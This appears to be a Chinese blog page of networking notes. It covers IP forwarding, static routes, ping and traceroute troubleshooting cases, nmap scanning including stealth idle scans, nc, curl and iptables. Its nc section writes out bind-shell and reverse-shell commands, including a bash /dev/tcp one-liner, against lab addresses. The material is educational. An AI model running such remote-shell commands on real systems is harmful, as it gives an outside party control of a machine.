<h4 id="ip-forward跟路由转发的联系及作用"><a href="#ip-forward跟路由转发的联系及作用" class="headerlink" title="ip_forward跟路由转发的联系及作用"></a>ip_forward跟路由转发的联系及作用</h4><p>路由转发是指在网络中，当一个数据包的目标地址与源地址不在同一个网络时，数据包从一个网络节点传送到另一个网络节点，以实现数据包的路由和转发。这个过程需要路由器或者具有路由功能的设备来进行。</p>
<p>具体来说，ip_forward可以实现路由器的功能，利用主机上的两块网卡（网卡处于不同网段），将数据包在两块网卡之间进行传送，实现两个网络之间的访问。</p>
<p>当一个数据包到达一个具有多个网卡的设备时，设备会根据数据包的目的IP地址和路由表来决定将数据包发送到哪个网卡上。在这个过程中，ip_forward会根据路由表对数据包进行转发。</p>
<p>如果没有ip_forward，那么当一个数据包到达一个具有多个网卡的设备时，设备就无法决定将数据包发送到哪个网卡上，也就无法实现路由和转发功能。因此，ip_forward是实现路由和转发功能的关键。</p>
<h4 id="windows配置静态路由："><a href="#windows配置静态路由：" class="headerlink" title="windows配置静态路由："></a>windows配置静态路由：</h4><p><a href="https://blog.csdn.net/u010178308/article/details/80969112">windows如何添加静态路由_windows添加路由-CSDN博客</a></p>
<p>\1. 查看所有的路由信息</p>
<p>route print</p>
<p>\2. 添加一条路由条目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">route add -p 10.0.0.0 mask 255.0.0.0 10.10.16.1</span><br><span class="line">// -p 参数永久添加，不用 -p 为临时生效</span><br></pre></td></tr></table></figure>

<p>\3. 删除路由条目</p>
<p>route delete 157.0.0.0 MASK 255.0.0.0</p>
<p>\4. 修改路由条目（CHANGE 只用于修改网关和&#x2F;或跃点数）</p>
<p>route CHANGE 157.0.0.0 MASK 255.0.0.0 157.55.80.5 METRIC 2 IF 2</p>
<h4 id="Linux配置静态路由："><a href="#Linux配置静态路由：" class="headerlink" title="Linux配置静态路由："></a>Linux配置静态路由：</h4><p>临时的配置见参考链接</p>
<p>CentOS（<strong>永久</strong>）</p>
<p>推荐方式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">10.10.12.0/24 via 10.10.15.1</span><br><span class="line">10.10.13.0/24 via 10.10.15.1</span><br><span class="line">10.10.14.0/24 via 10.10.15.1</span><br><span class="line">10.10.15.0/24 via 10.10.15.1</span><br><span class="line">10.10.16.0/24 via 10.10.15.1</span><br><span class="line">&#x27; &gt; /etc/sysconfig/network-scripts/route-eth0</span><br></pre></td></tr></table></figure>

<p>另外一种方法：使用 network.service（CentOS7 默认，CentOS8 需要 <code>yum install network-scripts</code>）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;</span><br><span class="line">any net 10.10.13.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.14.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.15.0/24 gw 10.10.15.1</span><br><span class="line">any net 10.10.16.0/24 gw 10.10.15.1</span><br><span class="line">&#x27; &gt; /etc/sysconfig/static-routes</span><br></pre></td></tr></table></figure>

<p>验证</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip route</span><br></pre></td></tr></table></figure>

<h4 id="开启Linux系统的IP转发功能"><a href="#开启Linux系统的IP转发功能" class="headerlink" title="开启Linux系统的IP转发功能:"></a>开启Linux系统的IP转发功能:</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/sysctl.d/99-sysctl.conf</span><br><span class="line"></span><br><span class="line">结尾添加：net.ipv4.ip_forward = 1</span><br><span class="line"></span><br><span class="line">sysctl -p #查看修改结果.</span><br></pre></td></tr></table></figure>

<h4 id="什么时候需要开启Linux系统的IP转发功能"><a href="#什么时候需要开启Linux系统的IP转发功能" class="headerlink" title="什么时候需要开启Linux系统的IP转发功能"></a>什么时候需要开启Linux系统的IP转发功能</h4><p>一般来说，Linux系统默认是禁止数据包转发的，但在以下几种情况下可能需要开启IP转发功能：</p>
<ol>
<li>实现路由器功能：当一个Linux系统拥有多于一块的网卡时，如果一块网卡收到数据包，根据数据包的目的IP地址将包发往本机另一网卡，该网卡根据路由表继续发送数据包，这通常就是路由器所要实现的功能。这时需要开启IP转发功能。</li>
<li>配置网络负载均衡：Linux要求转发功能可以有效支持负载均衡。将多台服务器的要求转发到同一虚拟服务器上，可以有效利用服务器的处理能力，避免瓶颈的产生，提高服务器的处理能力和性能。</li>
</ol>
<p>需要注意的是，开启Linux系统的IP转发功能需要具备一定的网络知识和技能，如果不熟悉相关操作，建议在进行任何更改之前先备份系统或咨询专业的网络管理员。</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/fanggege/p/11312050.html">ip_forward与路由转发 - fanggege - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/ssgeek/p/9220690.html">配置Linux实现静态路由 - SSgeek - 博客园 (cnblogs.com)</a></p>
<h3 id="网络排错命令"><a href="#网络排错命令" class="headerlink" title="网络排错命令"></a>网络排错命令</h3><h4 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h4><p><a href="https://zhuanlan.zhihu.com/p/342214112">精华 | 网络故障排除命令汇总【网工必须收藏】 - 知乎 (zhihu.com)</a></p>
<p>原理：源站点向目的站点发出一个ICMP Echo Request报文，目的站点收到该报文后回一个ICMP Echo Reply报文，这样就验证了两个节点间IP层的可达性－－表示了网络层是连通的。</p>
<p>功能：用于检查IP网络连接及主机是否可达。</p>
<p>连续 Ping：<code>ping –t 192.168.0.1</code> (Windows 系统)</p>
<h5 id="判断是连通性问题还是性能问题"><a href="#判断是连通性问题还是性能问题" class="headerlink" title="判断是连通性问题还是性能问题"></a>判断是连通性问题还是性能问题</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows：</span></span><br><span class="line">ping -n 20 -w 4000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux:</span></span><br><span class="line">ping -c 20 -W 4000 192.168.71.1</span><br></pre></td></tr></table></figure>

<p>即连续发送20个报文，每个报文的超时时长为4000ms，这样一般可以判断出到底是连通性问题还是性能问题。</p>
<h5 id="使用大包ping对端进行MTU不一致的故障排除"><a href="#使用大包ping对端进行MTU不一致的故障排除" class="headerlink" title="使用大包ping对端进行MTU不一致的故障排除"></a><strong>使用大包ping对端进行MTU不一致的故障排除</strong></h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">windows</span></span><br><span class="line">ping -n 2 -l 1000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux:</span></span><br><span class="line">ping -c 1 -s 1000 192.168.91.128</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这是发送一个大小为1000字节的包来检查连接状态</span></span><br></pre></td></tr></table></figure>

<p>由于linux的Ping 缺省报文是64个字节，所以显示的Ping 通信息只是表示64字节的报文可以通而并不一定表示其他大小的报文仍旧可以通。所以，应当善于使用Ping的其他参数来进行故障排除。（此处以linux举例）</p>
<h5 id="A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）"><a href="#A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）" class="headerlink" title="A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）"></a>A能够Ping通B则B一定能够Ping通A（不考虑防火墙的因素）</h5><ul>
<li>如果是指两台主机，那么这句话就是正确的。</li>
<li>如果是指两台路由器那就是错误的，因为路由器通常会有多个IP地址。现在就有如下问题：当从一台路由器上执行Ping命令它发出的ICMP Echo报文的源地址究竟选择哪一个呢？实际情况是路由器选择发出报文的接口的IP地址。</li>
</ul>
<h4 id="Traceroute"><a href="#Traceroute" class="headerlink" title="Traceroute"></a><strong>Traceroute</strong></h4><p>（该命令应用在linux系统中）</p>
<p><a href="https://zhuanlan.zhihu.com/p/342214112">精华 | 网络故障排除命令汇总【网工必须收藏】 - 知乎 (zhihu.com)</a></p>
<p>原理：Traceroute是为了探测源节点到目的节点之间数据报文所经过的路径。</p>
<p>功能：Traceroute 命令用于测试数据报文从发送主机到目的地所经过的网关，主要用于检查网络连接是否可达，以及分析网络什么地方发生了故障。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">linux</span></span><br><span class="line">traceroute -m 10 www.baidu.com # 跳数设置</span><br><span class="line">traceroute -n www.baidu.com    # 显示IP地址，不查主机名</span><br><span class="line">traceroute -p 6888 www.baidu.com  # 探测包使用的基本UDP端口设置6888</span><br><span class="line">traceroute -q 4 www.baidu.com  # 把探测包的个数设置为值4</span><br><span class="line">traceroute -r www.baidu.com    # 绕过正常的路由表，直接发送到网络相连的主机</span><br><span class="line">traceroute -w 3 www.baidu.com  # 把对外发探测包的等待响应时间设置为3秒</span><br></pre></td></tr></table></figure>

<h5 id="案例一：使用Traceroute命令定位不当的网络配置点"><a href="#案例一：使用Traceroute命令定位不当的网络配置点" class="headerlink" title="案例一：使用Traceroute命令定位不当的网络配置点"></a><strong>案例一：使用Traceroute命令定位不当的网络配置点</strong></h5><p>(1) 现象描述</p>
<p>组网情况如下图所示：</p>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-7fcfcfa628ba6923e4264c15a8cb6bf2_1440w.webp" class title="img">



<p>某校园网中，RouterB和RouterC同属于一个运行RIPv2路由协议的网络，主机4.0.0.2访问数据库服务器5.0.0.2，用户抱怨访问性能差。</p>
<p>(2) 相关信息显示</p>
<p>在主机上ping 5.0.0.2显示如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">C:\Documents and Settings\c&gt;ping -n 10 -l 1000 5.0.0.2</span><br><span class="line"></span><br><span class="line">Pinging 5.0.0.2 with 1000 bytes of data:</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=552ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5735ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=551ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5734ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=549ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5634ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=555ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5738ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=455ms TTL=250</span><br><span class="line">Reply from 5.0.0.2: bytes=1000 time=5811ms TTL=250</span><br></pre></td></tr></table></figure>

<p>原因分析</p>
<p>上面的Ping显示出一个规律：奇数报文的返回时长短，而偶数报文返回时长很长（是奇数报文的10倍多）。可以初步判断奇数报文和偶数报文是通过不同的路径传输的。现在我们需要使用Traceroute命令来追踪这不同的路径。在RouterC上，Traceroute远端RouterA的以太网接口5.0.0.1。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">RouterC(config)#</span><span class="language-bash">traceroute</span></span><br><span class="line"> Target IP address or host: 5.0.0.1</span><br><span class="line">Maximum number of hops to search for target [30]:10</span><br><span class="line">Repeat count for each echo[3]:8</span><br><span class="line">Wait timeout milliseconds for each reply [2000]:</span><br><span class="line"></span><br><span class="line">Type esc/CTRL^c/CTRL^z/q to abort.</span><br><span class="line">traceroute 5.0.0.1 ......</span><br><span class="line">1    6 ms  4 ms  4 ms  4 ms  4 ms  4 ms  4 ms  4 ms   4.0.0.1</span><br><span class="line">  。。。。。。（中间省略）</span><br><span class="line">5  20 ms  16 ms  15 ms  16 ms  16 ms  16 ms  16 ms  16 ms  3.0.0.2</span><br><span class="line">6  30 ms  278 ms  25 ms  279 ms  25 ms  278 ms  25 ms  277 ms  5.0.0.1</span><br><span class="line"><span class="meta prompt_">RouterC(config)#</span></span><br></pre></td></tr></table></figure>

<p>从上面的显示可看到，直至3.0.0.2，UDP探测报文的返回时长都基本一致，而到5.0.0.1时，则发生明显变化，呈现奇数报文时长短，偶数报文时长长的现象。于是判断，问题发生在RouterB和RouterA之间。</p>
<p>通过询问该段网络的管理员，得知这两路由器间有一主一备两串行链路，主链路为2.048Mbps（s0口之间），备份链路为128Kbps（s1口之间）。网络管理员在此两路由器间配置了静态路由。</p>
<p>RouterB上如下配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 1.0.0.2</span><br><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 2.0.0.2</span><br><span class="line">RouterA上如下配置：</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 1.0.0.1</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 2.0.0.1</span><br></pre></td></tr></table></figure>

<p>于是问题就清楚了。例如RouterB，由于管理员配置时没有给出静态路由的优先级，这两条路由项的管理距离就同为缺省值1，于是就同时出现在路由表中，实现的是负载分担，而不能达到主备的目的。</p>
<p>(3) 处理过程</p>
<p>可以有两种处理方法：</p>
<ul>
<li>继续使用静态路由，进行配置更改 RouterB上进行如下更改：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 1.0.0.2 （主链路仍使用缺省1）</span><br><span class="line">RouterB（config）# ip route 5.0.0.0 255.0.0.0 2.0.0.2 100（备份链路的降低至100）</span><br></pre></td></tr></table></figure>

<p>RouterA上进行如下更改：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 1.0.0.1</span><br><span class="line">RouterA（config）# ip route 0.0.0.0 0.0.0.0 2.0.0.1 100</span><br></pre></td></tr></table></figure>

<p>这样，只有当主链路发生故障，备份链路的路由项才会出线在路由表中，从而接替主链路完成报文转发，实现主备目的。</p>
<ul>
<li>在两路由器上运行动态路由协议，如OSPF，但不要运行RIP协议（因为RIP协议是仅以hop作为Metric的）</li>
</ul>
<p>(4) 建议和总结</p>
<p>本案例的目的不是为了解释网络配置问题，而是用来展示Ping命令和Traceroute命令的相互配合来找到网络问题的发生点。尤其在一个大的组网环境中，维护人员可能无法沿着路径逐机排查，此时，能够迅速定位出发生问题的线路或路由器就非常重要了。</p>
<h5 id="案例二：使用Traceroute命令发现路由环路"><a href="#案例二：使用Traceroute命令发现路由环路" class="headerlink" title="案例二：使用Traceroute命令发现路由环路"></a><strong>案例二：使用Traceroute命令发现路由环路</strong></h5><p>(1) 现象描述 组网情况如下图所示：</p>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/v2-97e0a417d4f802b6466f6a0a8c3e7641_1440w.webp" class title="img">

<p>三台路由器均配置静态路由，完成后，登录到RouterA上Ping主机4.0.0.2，发现不通。</p>
<p>(2) 相关信息显示</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">RouterA# </span><span class="language-bash">ping  4.0.0.2</span></span><br><span class="line">Sending 5, 100-byte ICMP Echos to 4.0.0.2,</span><br><span class="line">timeout is 2000 milliseconds.</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">Success rate is 0 percent (0/5)</span><br><span class="line"><span class="meta prompt_">RouterA# </span><span class="language-bash">traceroute 4.0.0.2</span></span><br><span class="line"> Type esc/CTRL^c/CTRL^z/q to abort.</span><br><span class="line">traceroute 4.0.0.2 ......</span><br><span class="line">1  6 ms  4 ms  4 ms   1.0.0.1（RouterB）</span><br><span class="line"> 2  8 ms  8 ms  8 ms   1.0.0.2（RouterA）</span><br><span class="line"> 3  12 ms  12 ms  12 ms 1.0.0.1（RouterB）</span><br><span class="line"> 4  16 ms  16 ms  16 ms 1.0.0.2（RouterA）</span><br><span class="line"> 。。。。。。</span><br></pre></td></tr></table></figure>

<p>(3) 原因分析</p>
<p>从上面的Traceroute命令的显示可以立即发现，在RouterA和RouterB间产生了路由环路。由于是配置的是静态路由，基本可以断定是RouterA或RouterB的静态路由配置错误。 检查RouterA的路由表，配置的是缺省静态路由：<code>ip route 0.0.0.0 0.0.0.0 1.0.0.1</code>，没有问题。</p>
<p>检查RouterB的路由表，配置到4.0.0.0网络的静态路由为：<code>ip route 4.0.0.0 255.0.0.0 1.0.0.2</code>――下一跳配置的是1.0.0.2，而不是3.0.0.1。这正是错误所在。</p>
<p>(4) 处理过程</p>
<p>修改RouterB的配置如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">RouterB（config）# no ip route 4.0.0.0 255.0.0.0 1.0.0.2</span><br><span class="line">RouterB（config）# ip route 4.0.0.0 255.0.0.0 3.0.0.1</span><br></pre></td></tr></table></figure>

<p>故障排除。</p>
<p>(5) 建议和总结</p>
<p>Traceroute命令能够很容易发现路由环路等潜在问题。当路由器A认为路由器B知道到达目的地的路径，而路由器B也认为路由器A知道目的地时，就是路由环路发生了。使用Ping命令只能知道接收端出现超时错误，而Traceroute能够立即发现环路所在――如果Traceroute命令两次或者多次显示同样的接口。</p>
<p>当通过Traceroute发现路由环路后，如果配置为：</p>
<ul>
<li>静态路由：几乎可以肯定是手工配置有问题，如本案例所示。</li>
<li>OSPF协议：可能是地址聚合产生的问题。</li>
<li>多路由协议：可能是路由引入产生的问题。</li>
</ul>
<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>nmap是一款非常强大的主机发现和端口扫描工具，而且nmap运用自带的脚本，还能完成漏洞检测，同时支持多平台。</p>
<h5 id="nmap常用命令"><a href="#nmap常用命令" class="headerlink" title="nmap常用命令"></a>nmap常用命令</h5><h5 id="实例演示-发现主机"><a href="#实例演示-发现主机" class="headerlink" title="实例演示-发现主机"></a>实例演示-发现主机</h5><p>扫描指定IP地址(ping 扫描)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.3.74</span><br></pre></td></tr></table></figure>

<p>提取文件中的IP地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>

<p>扫描整个网段</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.3.1/24</span><br></pre></td></tr></table></figure>

<h5 id="实例演示-端口发现"><a href="#实例演示-端口发现" class="headerlink" title="实例演示-端口发现"></a>实例演示-端口发现</h5><p>扫描主机的指定端口</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.3.74 -p80</span><br></pre></td></tr></table></figure>


<p>使用TCP的SYN进行扫描（半开放扫描，只发送SYN，如果服务器回复SYN，ACK。证明端口开放，不建立完整连接）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sS  192.168.3.74</span><br></pre></td></tr></table></figure>

<p>使用TCP进行扫描（默认nmap扫描方式）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sT  192.168.3.74</span><br></pre></td></tr></table></figure>

<p>使用UDP进行扫描（扫描UDP开放的端口）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sU 192.168.3.74</span><br></pre></td></tr></table></figure>

<p>使用FIN扫描</p>
<p>有的时候TCP SYN不是最佳的扫描默认，目标主机可能有IDS&#x2F;IPS系统的存在，防火墙可能过滤掉SYN数据包。而发送一个</p>
<p>FIN标志的数据包不需要完成TCP的握手。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sF  192.168.3.74</span><br></pre></td></tr></table></figure>

<p>idle扫描（需要指定另外一台主机IP地址，并且目标主机的IPID是递增的）</p>
<p>idlescan是一种理想的扫描方式，它使用另一台网络上的主机替你发送数据包，从而隐藏自己。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sI  192.168.3.227 192.168.3.74</span><br></pre></td></tr></table></figure>

<h5 id="实例演示-获得服务版本详细信息"><a href="#实例演示-获得服务版本详细信息" class="headerlink" title="实例演示-获得服务版本详细信息"></a>实例演示-获得服务版本详细信息</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.3.74</span><br></pre></td></tr></table></figure>

<h5 id="实例演示-确定主机操作系统"><a href="#实例演示-确定主机操作系统" class="headerlink" title="实例演示-确定主机操作系统"></a>实例演示-确定主机操作系统</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.3.227</span><br></pre></td></tr></table></figure>

<h5 id="实例应用"><a href="#实例应用" class="headerlink" title="实例应用"></a>实例应用</h5><p><a href="https://www.cnblogs.com/weihua2616/p/6599629.html">扫描工具——Nmap用法详解 - 毛卫华 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://blog.csdn.net/smli_ng/article/details/105964486">nmap详细使用教程_nmap使用教程-CSDN博客</a></p>
<h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><p>telnet经常用于测试网络及端口占用情况。具体使用如下：</p>
<p>测试端口命令：</p>
<p>telnet host 端口</p>
<p>例：telnet 192.168.31.100 8081</p>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/20181203234109944.png" class title="img">

<p>连接失败表示端口未占用。否则表示被占用,如下（8080端口已占用）：</p>
<p>例：telnet 192.168.31.100 8080</p>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/2018120323440996.png" class title="img">

<h4 id="Arp"><a href="#Arp" class="headerlink" title="Arp"></a>Arp</h4><p>显示第 2 层和第 3 层地址的映射表：Arp –a ；Windows&#x2F;Unix</p>
<h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 测试tcp一般会想到使用telnet</span></span><br><span class="line">telnet 192.168.12.10 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># telnet不支持udp协议，所以我们可以使用nc，nc可以支持tcp也可以支持udp</span></span><br><span class="line">nc -z -v 192.168.10.12 22 <span class="comment">#tcp</span></span><br><span class="line">nc -z -v -u 192.168.10.12 123 <span class="comment"># udp</span></span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第一个窗口</span></span><br><span class="line">nc -lv 999</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">第二个窗口</span></span><br><span class="line">nc -nv 192.168.71.101 999</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">互相都能接收到</span></span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113911923.png" class title="image-20231017113911923">

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017113928601.png" class title="image-20231017113928601">

<p>远程控制</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">正向控制，被控端主动设置监听端口及bash环境，控制端连接，如果有防火墙，需开放端口，否则会被拦截。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888 -c bash</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114342539.png" class title="image-20231017114342539">

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114505036.png" class title="image-20231017114505036">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">反向控制，控制端设置监听端口，被控端主动连接控制端的ip及端口，并提供bash环境。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控制端执行下面的命令：</span></span><br><span class="line">nc 192.168.75.121 8888 -c bash</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114700376.png" class title="image-20231017114700376">

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017114852436.png" class title="image-20231017114852436">

<p>反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">控制端执行下面的命令：</span></span><br><span class="line">nc -lvnp 8888</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被控端执行下面的命令:</span></span><br><span class="line">bash -i &amp;&gt; /dev/tcp/192.168.75.121/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115035651.png" class title="image-20231017115035651">

<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/image-20231017115048774.png" class title="image-20231017115048774">

<h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote>
<p>curl -l</p>
</blockquote>
<p>可以看到http response的头信息</p>
<blockquote>
<p>curl -v</p>
</blockquote>
<p>可以显示一次http通信的整个过程，包括端口连接以及http response头信息</p>
<blockquote>
<p>curl -L</p>
</blockquote>
<p>实现url重定向，用户有301,302跳转的网址(比如http跳转到https)，可以显示跳转后的网址的访问情况。</p>
<blockquote>
<p>curl -o</p>
</blockquote>
<p>表示将文件保存为命令行中指定的文件名的文件中，可以测试文件的下载的情况，比如-oa表示文件保存的命名为a，一般可以设置-o &#x2F;dev&#x2F;null 它是一个空设备，是一个特殊的设备文件，它丢弃一切写入其中的数据，所以本地没有该文件的保存。</p>
<blockquote>
<p>curl -vX POST “url” -d “name&#x3D;123.jpg”</p>
</blockquote>
<p>可以指定什么方式请求，默认是GET请求，另外，也可以指定post，delete，比如使用七牛过程中验证回调异常情况可以给自己的服务器发送一个表单的POST请求，可以参考七牛设置notifyURL没有收到回调。</p>
<blockquote>
<p>curl -d “user&#x3D;aaa&amp;password&#x3D;12345” <a href="http://www.aaa.com/login.php">http://www.aaa.com/login.php</a></p>
</blockquote>
<p>可以模拟发送的携带的表单的数据</p>
<blockquote>
<p>curl -s -o &#x2F;dev&#x2F;null -w%{http_code}”\n” <a href="http://www.baidu.com/">http://www.baidu.com</a></p>
</blockquote>
<p>获取http的状态码</p>
<p>-w：从文件中读取要打印信息的格式<br>-o &#x2F;dev&#x2F;null：把响应的内容丢弃，因为我们这里并不关心它，只关心请求的耗时情况<br>-s：不要打印进度条</p>
<blockquote>
<p>curl -O <a href="https://www.qianzhigang.com/archives/880.html">https://www.qianzhigang.com/archives/880.html</a></p>
</blockquote>
<p>-O: 该参数使用url中默认的文件名保存文件到本地</p>
<blockquote>
<p>curl -o test.html <a href="https://www.qianzhigang.com/archives/880.html">https://www.qianzhigang.com/archives/880.html</a></p>
</blockquote>
<p>-o: 该参数将文件保存为命令行中默认的文件名保存文件到本地</p>
<h3 id="测试Linux服务器能否连通外网的命令："><a href="#测试Linux服务器能否连通外网的命令：" class="headerlink" title="测试Linux服务器能否连通外网的命令："></a>测试Linux服务器能否连通外网的命令：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br><span class="line"></span><br><span class="line">curl -I www.baidu.com</span><br><span class="line"></span><br><span class="line">traceroute www.baidu.com</span><br></pre></td></tr></table></figure>

<h3 id="iptables-学习"><a href="#iptables-学习" class="headerlink" title="iptables 学习"></a>iptables 学习</h3><h4 id="iptables简介"><a href="#iptables简介" class="headerlink" title="iptables简介"></a>iptables简介</h4><p>iptables 是集成在 Linux 内核中的包过滤防火墙系统。使用 iptables 可以添加、删除具体的过滤规则，iptables 默认维护着 4 个表和 5 个链，所有的防火墙策略规则都被分别写入这些表与链中。</p>
<p>“<strong>四表</strong>”是指 iptables 的功能，默认的 iptable s规则表有 filter 表（过滤规则表）、nat 表（地址转换规则表）、mangle（修改数据标记位规则表）、raw（跟踪数据表规则表）：</p>
<p>filter 表：控制数据包是否允许进出及转发，可以控制的链路有 INPUT、FORWARD 和 OUTPUT。<br>nat 表：控制数据包中地址转换，可以控制的链路有 PREROUTING、INPUT、OUTPUT 和 POSTROUTING。<br>mangle：修改数据包中的原数据，可以控制的链路有 PREROUTING、INPUT、OUTPUT、FORWARD 和 POSTROUTING。<br>raw：控制 nat 表中连接追踪机制的启用状况，可以控制的链路有 PREROUTING、OUTPUT。</p>
<p>“<strong>五链</strong>”是指内核中控制网络的 NetFilter 定义的 5 个规则链。每个规则表中包含多个数据链：INPUT（入站数据过滤）、OUTPUT（出站数据过滤）、FORWARD（转发数据过滤）、PREROUTING（路由前过滤）和POSTROUTING（路由后过滤），防火墙规则需要写入到这些具体的数据链中。</p>
<p>Linux 防火墙的过滤框架，如图所示。</p>
<img data-src="/2023/10/11/%E7%BD%91%E7%BB%9C%E5%8F%8A%E5%8D%8F%E8%AE%AE/ce49aedfc45c82ef6a6f261c82af07a4.gif" class title="Linux命令">

